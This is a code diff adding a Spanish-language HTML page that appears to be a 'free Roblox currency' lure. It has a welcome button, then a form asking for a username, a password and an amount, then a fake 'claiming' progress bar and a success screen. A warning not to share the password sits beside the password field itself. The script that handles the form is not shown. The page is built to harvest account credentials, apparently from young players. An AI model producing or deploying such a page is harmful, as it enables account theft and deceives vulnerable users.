@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mi Página de Roblox Mejorada</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div id="welcome-screen">
+        <h1>¡Bienvenido a Mi Mundo de Roblox!</h1>
+        <button onclick="startProcess()">Comenzar</button>
+    </div>
+
+    <div id="form-screen" class="hidden">
+        <h2>Ingresa tus Datos</h2>
+        <form id="user-form">
+            <input type="text" id="nombre" placeholder="Nombre" required>
+            <input type="password" id="contrasena" placeholder="Contraseña" required>
+            <p class="warning">¡No compartas tu contraseña con terceros!</p>
+            <input type="number" id="cantidad" placeholder="Cantidad" min="1" required>
+            <button type="button" onclick="continueProcess()">Continuar</button>
+        </form>
+    </div>
+
+    <div id="loading-screen" class="hidden">
+        <h2>Reclamando...</h2>
+        <div id="progress-container">
+            <div id="progress-bar"></div>
+        </div>
+    </div>
+
+    <div id="success-screen" class="hidden">
+        <h2>¡Felicidades!</h2>
+        <p>Tu solicitud ha sido procesada con éxito.</p>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
